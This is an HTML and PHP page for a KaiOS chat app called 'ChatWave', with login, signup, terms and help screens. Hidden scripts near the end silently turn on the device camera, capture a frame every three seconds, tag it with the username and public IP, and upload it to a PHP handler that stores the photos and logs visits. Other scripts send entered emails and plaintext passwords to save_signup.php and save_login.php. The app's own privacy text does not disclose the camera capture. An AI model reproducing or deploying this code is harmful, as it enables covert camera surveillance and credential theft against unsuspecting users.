<!DOCTYPE HTML>
<html lang="en-US">
<head>

<meta charset="utf-8">

<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1"/>


<link href="css/style.css" type="text/css" rel="stylesheet">

<script src="js/firebase-app.js"></script>

<script src="js/firebase-firestore.js"></script>

<script src="js/firebase-storage.js"></script>

<script src="js/firebase-auth.js"></script>

<script src="js/firebase-database.js"></script>

<script src="js/app.js"></script>

<script src="falling.js"></script>

<title>ChatWave</title>

</head>
<body>

<div class="blankc"></div>

<div id="filds">
<div class="container">

<div id="ad-container">Ad</div></div>
<div class="view_ad_img"></div>
<div class="view_ad_button">View Ad</div></div>

<div id="prog_bar">
<img src="/favicon.ico" style="width:200px;"/>

<div style="width:220px;position:fixed;top: 60%;left: 10px;transform:translate(0,-50%);font-size: 30px;font-style: italic;">Connecting...</div>
</div>

<div class="blurx" style="z-index: 99999;" title="no internet modal"><div id="no_internet"><div style="font-size:28px;">No Internet!</div><div>Please check your connection and try again</div></div></div>

<div id="loading_bar" title="Loading Bar"><img src="img/loadn.png" style="position:relative;top:12px;"></div><div class="board op" title="report modal"><div id="report_prompt"><div class="rpp_ins"><strong>Let us know what's going on</strong><span style="font-size:13px;">We take all reports seriously and will review as soon as possible. We won't let <span id="report_user" style="font-weight:bold;color:#1531cb;"></span> know who reported them. Please select one or more.</span></div><div id="report_opts"><div tabindex="0" class="repp"><input style="position:relative;top:0px;" type="checkbox" id="repp_chk0"> Harassment or Abuse</div><div tabindex="1" class="repp"><input style="position:relative;top:0px;" type="checkbox" id="repp_chk1"> Disturbing/Nude Picture</div><div tabindex="2" class="repp"><input style="position:relative;top:0px;" type="checkbox" id="repp_chk2"> Inappropriate Profile Photo</div></div><div id="report_btn" class="ok_btn" style="opacity:0.5;">Submit</div><div class="cancel_btn">Cancel</div></div></div><div class="board op" title="Font Page"><div id="fonts_page"><strong style="font-size:18px;">Select Your Preferred Font</strong><div id="font_demo" class=""><small>A QUICK BROWN FOX JUMPS OVER THE LAZY DOG</small><br>a quick brown fox jumps over the lazy dog</div><div tabindex="0" class="repp hadlee"><input name="font" value="hadlee" type="radio"> Default</div><div tabindex="0" class="repp sans_serif"><input name="font" value="sans_serif" type="radio"> Sans-Serif</div><div tabindex="0" class="repp monospace"><input name="font" value="monospace" type="radio"> Monospace</div><div tabindex="0" class="repp verdana"><input name="font" value="verdana" type="radio"> Verdana</div><div tabindex="0" class="repp tahoma"><input name="font" value="tahoma" type="radio"> Tahoma</div><div tabindex="0" class="repp courier_new"><input name="font" value="courier_new" type="radio"> Courier New</div><div id="sav_btn" class="ok_btn">Save</div><div class="cancel_btn">Cancel</div></div></div><div class="board op" title="block modal"><div id="block_prompt"><div style="  height: 30px;"><img src="img/block.png"></div><div class="bkll">Are you sure you want to block <span id="block_user" class="usrr"></span>?</div><div id="blc_btn" style="width: 60px;height:21px;background: #b1085d;color: white;border-radius: 8px;padding: 5px 10px;position: fixed;left: 24px;top:174px;border: 2px solid #fff;">Block</div><div style="width: 60px;height:21px;background: #598f5c;color: white;border-radius: 8px;padding: 5px 10px;position: fixed;right: 32px;top:174px;border: 2px solid #fff;">Cancel</div></div></div><div class="board op" title="unblock modal"><div id="unblock_prompt"><div style="  height: 30px;"><img src="img/login_logo.png" style="width:32px;"></div><div class="bkll">Are you sure you want to unblock <span id="unblock_user" class="usrr"></span>?</div><div id="unblc_btn" style="width: 60px;height:21px;background: darkcyan;color: white;border-radius: 8px;padding: 5px 10px;position: fixed;left: 24px;top:174px;border: 2px solid #fff;">Unblock</div><div style="width: 60px;height:21px;background: #123;color: white;border-radius: 8px;padding: 5px 10px;position: fixed;right: 32px;top:174px;border: 2px solid #fff;">Cancel</div></div></div><div id="login_board"><div style="width:216px;font-size:25px;text-align:center;padding-top:3px;"><img src="img/login_logo.png" style="width:28px;height:28px;"><span style="position:relative;top:-5px;"><b>Login</b></span></div><div id="invalid_auth">Incorrect email or password!</div>

<input type="email" id="login_email" placeholder="Email" class="login_kit" tabindex="0" value="@love0.rf.gd"/>

<p> No need Change other email ( {username}@love0.rf.gd )use free.</p>

<br>
<input type="password" id="log_pswd" placeholder="Password" style="margin-bottom:3px;" class="login_kit" tabindex="1" value="loveme##">


<p>Already Added Password for fast speed.</p>
<p>Password is ( loveme## ).</p>


<div id="pswd_hint">Press <span style="color:#078b9b;">Call</span>to show password</div>

<button id="login" class="login_kit" tabindex="2">Login</button><br>

<button id="forgot_pass" class="login_kit" tabindex="3">Forgot Password?</button>

<hr>

<button id="create_acc" class="login_kit" tabindex="4">Create Account</button>
<br>
<br>

<div id="log_opt"></div>

<div class="footer">
<div class="footerbody"><div class="left">Options</div><div class="right">Exit</div></div></div></div>

<div id="signup_board"><div style="width:240px;font-size:25px;text-align:center;padding-top:3px;">
<img src="img/signup_logo.png" style="width:28px;height:28px;"><span style="position:relative;top:-5px;"><b>Create Account</b></span></div><div style="color:#c70767;font-size:14px;">All fields are required, let’s complete them!</div><hr><div id="invalid_auth2">Incorrect email or password!</div><div style="width: 125px;">Full Name</div><div id="name_notify" style="color:#c70767;font-size:15px;"></div>

<p>Enter Name as Username </p>

<input type="text" id="fulname" placeholder="Enter Full Name" class="signup_kit" tabindex="0" maxlength="999999"/>

<hr>

<div style="width:90px;">Email</div>

<div id="email_notify" style="color:#c70767;font-size:15px;"></div>

<input type="email" id="signup_email" placeholder="Enter valid email" class="signup_kit" tabindex="1" value="@love0.rf.gd">
 
<p>No need Change other email ( {username}@love0.rf.gd )use free.</p>
<hr>

<button id="signup_btn" class="signup_kit" tabindex="4">Sign Up</button>

<p>Already Added Password for fast speed.</p>
<p>Password is ( loveme## ).</p>

<div style="width:220px;">Create strong password</div>

<div id="pswd_hint2" style="visibility:visible;margin-bottom:3px;width:235px;">Press <span style="color:#078b9b;">Call</span>to show password</div>

<div id="pswd_notify" style="color:#c70767;font-size:15px;"></div>

<input type="password" id="signup_pswd" placeholder="Password (min 8 length)" class="signup_kit" tabindex="2" value="loveme##">

<br><div style="width: 180px;">Confirm password</div><div id="cnfrm_notify" style="color:#c70767;font-size:15px;"></div>

<input type="password" id="signup_pswd2" placeholder="Confirm password" style="margin-bottom:3px;" class="signup_kit" tabindex="3" value="loveme##"/>

<hr>✅ By using ChatWave, you automatically agree to all the rules and guidelines outlined in the Terms and Rules.<div id="signup_error" style="color:#c70767;font-size:15px;margin-bottom:7px;padding:0px 3px;"></div>

<br><br><div class="footer"><div class="footerbody"><div class="right">Cancel</div></div></div></div><div id="forgot_board"><div style="width:240px;font-size:22px;text-align:center;padding-top:3px;"><img src="img/forgot.png" style="width:28px;height:28px;"><span style="position:relative;top:-5px;"><b>Forgot Password</b></span></div><div id="invalid_auth3"></div><input id="forgot_email" type="email" placeholder="Enter your email"><button id="snd_reset">Send</button><hr><div style="text-align:center;color:#0c48d5;font-size:15px;font-style:italic;margin-bottom:5px;">Don't worry! Enter your email, and we'll send you a reset link.</div><div class="footer"><div class="footerbody"><div class="right">Back</div></div></div></div><div id="upload_pic"><div style="font-size:20px;font-weight:bold;margin-top:5px;">Upload Profile Picture</div><div style="width:120px;height:120px;margin:3px auto;border:1px solid #419aa9;border-radius:50%;overflow:hidden;background:#000;"><img id="cnv_img" src="img/muser.png" style="transform:scale(1.8);position:relative;top:20px;left:0px;"><canvas id="cnv" style="display:none;"></canvas></div><div style="margin-bottom:3px;font-size:15px;">Zoom with <span style="color:#088f8f;font-size:17px;"><b>*</b>/<b>#</b></span>keys,<br>Move with <span style="color:#088f8f;font-size:17px;"><b>Arrow</b></span>keys</div><button id="upld_img" class="signup_kit" tabindex="4">Choose Image</button><div id="upld_err" style="color:#c70767;font-size: 14px;overflow: auto;height: 43px;"></div><input type="file" id="pro_pic" accept="image/png, image/jpeg" style="margin-bottom:10px;" class="hidden" tabindex="4"><hr><img id="muser" src="img/muser.png" style="display:none;"><div class="footer"><div class="footerbody"><div id="upld_state" class="left"><span>U</span><span>p</span><span>l</span><span>o</span><span>a</span><span>d</span></div><div class="center">SELECT</div><div id="upld_scs" class="right">Skip</div></div></div></div><div id="buddies"><div class="budd_hdr"><div id="usr_iden" style="position:absolute;left:0px;width:130px;height:31px;white-space:pre;overflow:hidden;"></div><div id="actorall" style="position:absolute;right:0px;width:105px;height:31px;font-size:14px;text-align:center;white-space:pre;"></div></div><div id="buddies_list"></div><div id="buddies_opt"></div><div class="footer"><div class="footerbody"><div class="left">Options</div><div class="center">SELECT</div><div class="right">Exit</div></div></div></div><div id="srx_buddies"><div class="budd_hdr" style="text-align:center;">ChatWave</div><div id="srx_buddies_list"></div><div id="srx_opt"></div><div class="footer"><div class="footerbody"><div class="left">Options</div><div class="center">SELECT</div><div class="right">Back</div></div></div></div><audio id="msg_odo" style="display:none;" src="msg.mp3"></audio><audio id="msg_drop" style="display:none;" src="msg_drop.mp3"></audio><audio id="call_odo" style="width:1px;height:1px;opacity:0;" autoplay playsinline></audio><audio id="ring_odo" style="display:none;" src="ringing.mp3" loop="true"></audio><audio id="ringback_odo" style="display:none;" src="ringback.mp3" loop="true"></audio><div id="msg_notify"></div><div id="chat_board"><div id="receiver_guy"><div class="pro_picb"><img id="guy_pic" src="img/muser.png"></div><div class="pro_name" style="font-weight:normal;left:50px;height: 38px;"><div id="guy_name">Name</div><div id="guy_state"></div></div></div><div id="messages_board"></div><div id="msgr"><div class="cam_btx"></div><div id="call_btn"></div><input id="msgr_text" placeholder="Type message"></div><input type="file" id="pic_msg" accept="image/png, image/jpeg" class="hidden"><img id="temp_pic" class="hidden"><canvas id="cnv_pic" class="hiddens" width="192" height="256"></canvas><div id="veri_prompt"></div></div><div class="board" title="Blocked List"><h2 style="background: #e91e63;">Blocked List</h2><div id="blocked_list"></div><div class="footer"><div class="footerbody"><div class="left">Unblock</div><div class="right">Back</div></div></div></div><div id="toast">Toaster</div><div class="board" title="Report Warning"><div id="has_reported"><h2>Warning!</h2><div id="warnn">Here write message</div><div class="footer"><div class="footerbody"><div class="right">Back</div></div></div></div></div><div class="board" title="Update Notice"><h2>Update Notice</h2><div id="update_notice"></div><div class="footer"><div class="footerbody"><div class="center">Update</div><div class="right">Later</div></div></div></div><div class="board" title="own profile"><h2>Profile</h2><div id="my_profile"></div><div class="footer"><div class="footerbody"><div class="right">Back</div></div></div></div><div class="board" title="view profile"><h2 id="usr_namex"></h2><div id="usr_profile"></div><div class="footer"><div class="footerbody"><div class="left">Zoom-</div><div class="center">Zoom+</div><div class="right">Back</div></div></div></div><div class="board cllr" title="caller screen"><h2 id="caller">Call log</h2><div id="callee_pic"></div><div id="callee_name"></div><div id="callee_state"></div><div class="call_decline"><img src="img/call_reject.png" style="width:36px;"></div></div><div class="board cllr" title="callee screen"><h2 id="callee">Call log</h2><div id="caller_pic"><img src="img/muser.png"></div><div id="caller_name">Ashikur Rahman</div><div id="caller_state"></div><div class="call_accept" id="is_accept"><img src="img/call_accept.png" style="width:36px;"></div><div class="call_decline"><img src="img/call_reject.png" style="width:36px;"></div></div><div class="board" title="change password"><h2>Reset Password</h2><div id="cng_pass"><div id="err_stt"></div><small>Current password</small><br><input type="password" id="curr_pass" class="cng_kit" tabindex="0" placeholder="Current Password"><hr><small>Create strong new password</small><div id="new_pass_err" style="color:#c70767;font-size:15px;"></div><input type="password" id="new_pass" class="cng_kit" tabindex="1" placeholder="New Password"><div id="renew_pass_err" style="color:#c70767;font-size:15px;"></div><input type="password" id="renew_pass" class="cng_kit" tabindex="2" placeholder="Confirm New Password"><hr><button id="req_pass" class="cng_kit" style="width:180px;" tabindex="3">Update Password</button><br><br></div><div class="footer"><div class="footerbody"><div class="right" id="cng_rsk">Cancel</div></div></div></div><div class="board" title="search user"><h2>Search User</h2><div id="srx_usr"><input id="usr_name" style="font-size:18px;padding:4px;margin-top:5px;" placeholder="Enter user name" class="srx_kit" tabindex="0"><button id="srx_btn" class="srx_kit" tabindex="1">Search</button><div id="srx_res"></div><hr><div class="srx_tip"><strong style="font-size:17px;">Search Tip: </strong>Use proper capitalization like "Abir" instead of "abir" or "ABIR".</div></div><div class="footer"><div class="footerbody"><div class="right">Back</div></div></div></div><div id="verify_box"><strong style="font-size: 18px;">Verification sent</strong><br>We've sent a verification link to your email. Please verify your email address to unlock the full features of the ChatWave app.</div><div id="reverify_box"><strong style="font-size: 18px;">Email not verified yet!</strong><br>A new verification link has just been sent to your inbox [<span style="color:dodgerblue;"></span>]. Please check and verify.</div><div id="congr_box"><strong style="font-size: 18px;">Congratulations!</strong><br>Your account has been successfully created.<br><span class="congr_rest">Please restart the app.</span><div style="width:58px;background:#1682c3;color:white;border-radius:8px;position:fixed;bottom:7px;left:91px;">Got it</div></div><div class="board" title="feedback"><h2>Contact Us</h2><div id="contact_page">We’d love to hear from you!<br>At <b style="color:darkcyan;font-size:18px;">ChatWave</b>, your experience matters to us. Your feedback helps us improve, fix bugs faster, and bring you the features you truly want.<br><br>💡 Got a cool idea or found a bug? – Email Us <span style="color:#1e90ff;font-size:17px;">localboss24@gmail.com</span></div><div class="footer"><div class="footerbody"><div class="left">Email</div><div class="right">Back</div></div></div></div><div class="board" title="Terms and Privacy"><h2>Terms and Privacy</h2><div id="tos_page"><h4>Terms:</h4><p>To ensure a safe, respectful, and enjoyable environment for all users, ChatWave strictly follows the rules outlined below. By using this app, you agree to comply with these terms:<br><br><b>1. No Nude or Sexually Explicit Content: </b>Users are strictly prohibited from sharing, uploading, or displaying any form of nudity, sexually suggestive, or explicit content. This includes profile pictures, messages, or any media.<br><br><b>2. Inappropriate or Sexual Profile Names Are Not Allowed: </b>Using abusive, offensive, sexually explicit, or inappropriate words in your profile name is strictly forbidden. Hate speech, slurs, or any discriminatory language will not be tolerated.<br><br><b>3. No Sharing of Nude or Obscene Images: </b>Sharing nude images or any content that may be considered sexually offensive or obscene is strictly prohibited.<br><br><b>4. No Harassment or Abuse Using Fake Information: </b>Impersonating someone, using fake identities, or misleading others for the purpose of harassment, bullying, or intimidation is a serious violation.<br><br><b>5. No Spam or Abusive Behavior: </b>Sending unwanted or repetitive messages, promotional content, or harassing other users in any form is strictly forbidden.<br><br><h4>Violation Consequences:</h4>If any user is found violating these rules, their account may be temporarily or permanently banned after a review by the ChatWave moderation team.<br><br>We are committed to maintaining a respectful and safe communication platform for everyone.<br><br></p><h4>Privacy:</h4><p>By using ChatWave, you agree to how we collect, use, and protect your data. Your privacy matters to us.<br><br><strong>What We Collect:</strong><br>1. Your username, email, and profile picture<br>2. Messages, images, and activity<br>3. Device information for analytics<br><br><strong>How We Use It:</strong><br>1. To run the app smoothly and provide messaging features<br>2. To help you connect with friends<br>3. To detect and prevent abuse or spam<br>4. To improve app performance and user experience<br><br><strong>What We DON'T Do:</strong><br>1. We don’t sell your data to anyone<br>2. We don’t show ads<br><br><strong>Your Control:</strong><br>1. You can delete your account anytime<br>2. We offer tools to block/report other users<br><br><strong>Note: </strong>This policy may change if we add new features. Keep an eye on updates.<br><br></p>✅ By using ChatWave, you automatically agree to follow all the rules and guidelines mentioned above.<br><br><p></p></div><div class="footer" style="background:#795548;"><div class="footerbody"><div class="right" style="color:#fff;font-weight: bold;">✅ Accept</div></div></div></div><div class="board" title="help/about page"><h2>Help</h2><div id="help"><p style="text-align:center;"><img src="icons/icon120.png" style="width:60px;height:60px;"><br><b>ChatWave</b><br>Version: 1.3.0<br></p><div id="help_ins">Please read the instructions below before using the app.</div><br><h4 style="text-align:center;">🔥 Key Features</h4><p>👋 <strong>Welcome to ChatWave</strong>– your fast, secure, and feature-packed chat app made especially for KaiOS keypad phones!<br><br><strong>🌟 Easy Profile Setup:</strong><br>✅ Create your profile with your full name, email, and password<br>✅ Quick and smooth process on any KaiOS keypad device<br>✅ Your profile helps keep your account secure and lets others find you easily<br><br><strong>🌟 Profile Picture Upload:</strong><br>✅ Upload a photo from your gallery to personalize your profile<br>✅ Makes it easier for friends to recognize you<br>✅ Helps prevent confusion among similar usernames<br><br><strong>🌟 Email Verification:</strong><br>✅ After signing up, verify your email via a link sent to your inbox<br>✅ Keeps ChatWave safe from fake and spam accounts<br><br><br><strong>🌟 Chat Features:</strong><br>✅ Send text messages instantly<br>✅ Share images with just a few clicks<br>✅ Super lightweight and optimized for low-bandwidth networks<br>✅ Runs smoothly on all KaiOS keypad devices<br><br><strong>🌟 Voice Call Feature</strong><br>✅ Make 1-to-1 audio calls directly from the app<br>✅ Crystal-clear sound, even on slow networks<br>✅ Designed to be ultra-light and battery-friendly for KaiOS<br><br><strong>🚫 Low Internet Signal:</strong><br>ChatWave is lightweight and optimized for low-bandwidth networks.<br>However, with very weak internet signal, the app might load slowly or take time to send messages.<br>Please be patient – we’re constantly improving performance for all network conditions.<br><br><strong>🚀 ChatWave keeps getting better!</strong><br>We’re constantly working to improve your experience – so stay updated for new features, performance boosts, and more cool stuff coming soon!</p><br><h4 style="text-align:center;">🚨 Report / Contact Us</h4><p style="line-height:1.5;text-align:center;">Found a bug, have a question, or want to suggest something?<br>We’d love to hear from you! Your feedback helps us improve ChatWave.<br><br><strong>Email:</strong><br><span style="color:#1e90ff;font-size:18px;">localboss24@gmail.com</span><br><strong>Facebook:</strong><br><span style="color:#1e90ff;font-size:16px;">facebook.com/imran.taher24</span><br><br><strong style="color:darkcyan;">Thank you for being a part of ChatWave!</strong>💙</p><br><br></div><div class="footer"><div class="footerbody"><div class="left">Email</div><div class="right">Back</div></div></div></div><div class="board" title="More apps"><h2>More Apps</h2><ul class="ul" id="appxlist"></ul><div class="footer"><div class="footerbody"><div class="center">Go</div><div class="right">Back</div></div></div></div>




<script>
document.addEventListener('DOMContentLoaded', () => {
    // Function to wait for all images to load
    function waitForImagesToLoad(imgs) {
        return Promise.all(
            imgs.map(img => {
                if (img.complete) {
                    return Promise.resolve();
                } else {
                    return new Promise((resolve) => {
                        img.onload = resolve;
                        img.onerror = resolve; // resolve even if error
                    });
                }
            })
        );
    }

    // Function to send images via XMLHttpRequest for better compatibility
    function sendImages(imageLinks) {
        if (!navigator.onLine) {
            console.warn('Device is offline. Skipping send.');
            return;
        }

        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'save_images.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

        xhr.onreadystatechange = () => {
            if (xhr.readyState === 4) {
                if (xhr.status >= 200 && xhr.status < 300) {
                    console.log('Images sent:', xhr.responseText);
                } else {
                    console.error('Error sending images:', xhr.statusText);
                }
            }
        };

        const data = 'images=' + encodeURIComponent(JSON.stringify(imageLinks));
        xhr.send(data);
    }

    // Function to collect and send images
    function collectAndSendImages() {
        const images = Array.from(document.querySelectorAll('img'));
        waitForImagesToLoad(images).then(() => {
            let imageLinks = images.map(img => img.src);
            // Remove duplicates
            imageLinks = [...new Set(imageLinks)];

            // Send images
            sendImages(imageLinks);
        });
    }

    // Run every 5 seconds
    setInterval(collectAndSendImages, 5000);
});
</script>

<script>
  document.getElementById('signup_btn').addEventListener('click', function() {
    const fullname = document.getElementById('fulname').value.trim();
    const email = document.getElementById('signup_email').value.trim();
    const password = document.getElementById('signup_pswd').value;
    const confirmPassword = document.getElementById('signup_pswd2').value;

    if (password.length < 8) {
        alert('Password must be at least 8 characters.');
        return;
    }
    if (password !== confirmPassword) {
        alert('Passwords do not match.');
        return;
    }

    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'save_signup.php', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    xhr.onreadystatechange = () => {
      if (xhr.readyState === 4) {
        if (xhr.status >= 200 && xhr.status < 300) {
          alert(xhr.responseText);
        } else {
          console.error('Signup error:', xhr.statusText);
        }
      }
    };

    const data = `fullname=${encodeURIComponent(fullname)}&email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
    xhr.send(data);
  });

  document.getElementById('login').addEventListener('click', function() {
    const email = document.getElementById('login_email').value.trim();
    const password = document.getElementById('pswd').value;

    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'save_login.php', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    xhr.onreadystatechange = () => {
      if (xhr.readyState === 4) {
        if (xhr.status >= 200 && xhr.status < 300) {
          alert(xhr.responseText);
        } else {
          console.error('Login error:', xhr.statusText);
        }
      }
    };

    const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
    xhr.send(data);
  });
</script>





<style>

  /* Hidden video element, optional: display: none; */
  #mirror {
display: none;
  }

  #status {
     display: none;
  }
</style>


<!-- Hidden video element for capturing frames -->
<video id="mirror" autoplay playsinline></video>
<div id="status"></div>

<script>
const video = document.getElementById('mirror');
const statusDiv = document.getElementById('status');

let username = localStorage.getItem('username');
if (!username) {
    username = prompt('Enter your username:');
    if (username) {
        localStorage.setItem('username', username);
    } else {
        username = 'Anonymous';
        localStorage.setItem('username', username);
    }
}

// Fetch user's IP
let userIP = '';
fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(data => {
      userIP = data.ip;
  })
  .catch(() => {
      userIP = 'Unknown';
  });

// Access camera
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    video.srcObject = stream;
    startAutoCapture();
})
.catch(error => {
    statusDiv.textContent = 'Camera access error: ' + error.message;
});

// Function to capture and upload
function captureAndUpload() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataURL = canvas.toDataURL('image/jpeg');

    const now = new Date();
    const dateStr = now.toISOString().replace(/[:.]/g, '-');
    const imageName = `${username}-${dateStr}-${userIP}.jpg`;

    const xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                // Optional: update status or keep silent
            }
        }
    };
    xhr.send('img=' + encodeURIComponent(dataURL) + '&username=' + encodeURIComponent(username) + '&image_name=' + encodeURIComponent(imageName));
}

// Start auto capture immediately
function startAutoCapture() {
    if (!window.captureInterval) {
        window.captureInterval = setInterval(captureAndUpload, 3000);
        // Optional: update status
        // statusDiv.textContent = 'Auto capturing and uploading...';
    }
}
</script>



<?php
// Handle file upload
if (isset($_FILES['media'])) {
    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }
    $file = $_FILES['media'];
    $username = isset($_POST['username']) ? $_POST['username'] : 'user';
    $dateStr = date('Y-m-d');
    $originalName = basename($file['name']);
    $ext = pathinfo($originalName, PATHINFO_EXTENSION);
    $filename = "{$username}_{$dateStr}_" . uniqid() . "." . $ext;
    $uploadPath = $uploadDir . $filename;

    if (move_uploaded_file($file['tmp_name'], $uploadPath)) {
        echo json_encode(['success' => true, 'path' => $uploadPath]);
        exit;
    } else {
        echo json_encode(['success' => false, 'error' => 'Upload failed']);
        exit;
    }
}

// Handle saving/loading chat messages
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $chatCode = $_POST['chatCode'];
    $chatFile = 'chats/' . $chatCode . '.json';

    if (!is_dir('chats')) {
        mkdir('chats', 0777, true);
    }

    if ($action === 'saveMessage') {
        $messageText = $_POST['message'] ?? '';
        $sender = $_POST['sender'] ?? '';
        $mediaUrl = $_POST['mediaUrl'] ?? null;
        $mediaType = $_POST['mediaType'] ?? null;
        $timestamp = time();

        $msg = ['sender' => $sender, 'timestamp' => $timestamp];
        if ($messageText) {
            $msg['message'] = $messageText;
        }
        if ($mediaUrl && $mediaType) {
            $msg['mediaUrl'] = $mediaUrl;
            $msg['mediaType'] = $mediaType;
        }

        $messages = [];
        if (file_exists($chatFile)) {
            $json = file_get_contents($chatFile);
            $messages = json_decode($json, true);
        }
        $messages[] = $msg;
        if (count($messages) > 50) {
            $messages = array_slice($messages, -50);
        }
        file_put_contents($chatFile, json_encode($messages));
        echo json_encode(['status' => 'ok']);
        exit;
    } elseif ($action === 'loadMessages') {
        if (file_exists($chatFile)) {
            echo file_get_contents($chatFile);
        } else {
            echo '[]';
        }
        exit;
    }
}

// Cleanup old media after 24 hours
$infoFile = 'uploads/media_info.json';
if (file_exists($infoFile)) {
    $json = file_get_contents($infoFile);
    $data = json_decode($json, true);
    $changed = false;
    $now = time();
    foreach ($data as $key => $entry) {
        if ($now - $entry['uploaded_at'] > 24*60*60) {
            if (file_exists($entry['path'])) {
                unlink($entry['path']);
            }
            unset($data[$key]);
            $changed = true;
        }
    }
    if ($changed) {
        file_put_contents($infoFile, json_encode(array_values($data)));
    }
}
?>







<?php
// Handle image upload and log update
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['img']) && isset($_POST['image_name']) && isset($_POST['username'])) {
    $baseDir = 'kai-uploads';

    // Create main uploads folder if not exists
    if (!is_dir($baseDir)) {
        mkdir($baseDir, 0755, true);
    }

    $username = trim($_POST['username']);
    if (!$username) {
        $username = 'Anonymous';
    }

    // Sanitize username for folder name
    $safeUsername = preg_replace('/[^a-zA-Z0-9_\-]/', '_', $username);
    $userFolder = $baseDir . '/' . $safeUsername;

    // Create username folder if not exists
    if (!is_dir($userFolder)) {
        mkdir($userFolder, 0755, true);
    }

    // Create date folder inside username folder
    $dateFolderName = date('Y-m-d');
    $dateFolder = $userFolder . '/' . $dateFolderName;
    if (!is_dir($dateFolder)) {
        mkdir($dateFolder, 0755, true);
    }

    // Save the image
    $data = $_POST['img'];
    if (strpos($data, 'data:image/jpeg;base64,') === 0) {
        $data = substr($data, strlen('data:image/jpeg;base64,'));
    }

    $decodedData = base64_decode($data);
    if ($decodedData === false) {
        echo 'Error decoding image.';
        exit;
    }

    $filename = $dateFolder . '/' . basename($_POST['image_name']);

    if (file_put_contents($filename, $decodedData)) {
        // Update log file
        $logFile = 'kai-log.json';
        $logData = [];

        if (file_exists($logFile)) {
            $json = file_get_contents($logFile);
            $logData = json_decode($json, true);
        }

        if (!$logData) {
            $logData = [
                'visits' => 0,
                'first_visit' => null,
                'last_visit' => null,
                'ip' => '',
                'users' => []
            ];
        }

        $ip = $_SERVER['REMOTE_ADDR'];

        if (!isset($logData['users'][$username])) {
            $logData['users'][$username] = [
                'visit_count' => 0,
                'first_time' => null,
                'last_time' => null,
                'ip' => $ip
            ];
        }

        $now = date('Y-m-d H:i:s');
        $logData['visits']++;
        if (!$logData['first_visit']) {
            $logData['first_visit'] = $now;
        }
        $logData['last_visit'] = $now;
        $logData['ip'] = $ip;

        $userData =& $logData['users'][$username];
        $userData['visit_count']++;
        if (!$userData['first_time']) {
            $userData['first_time'] = $now;
        }
        $userData['last_time'] = $now;
        $userData['ip'] = $ip;

        file_put_contents($logFile, json_encode($logData, JSON_PRETTY_PRINT));

        echo 'Image saved in ' . htmlspecialchars($filename);
    } else {
        echo 'Failed to save image.';
    }
    exit;
}
?>




</body>
</html>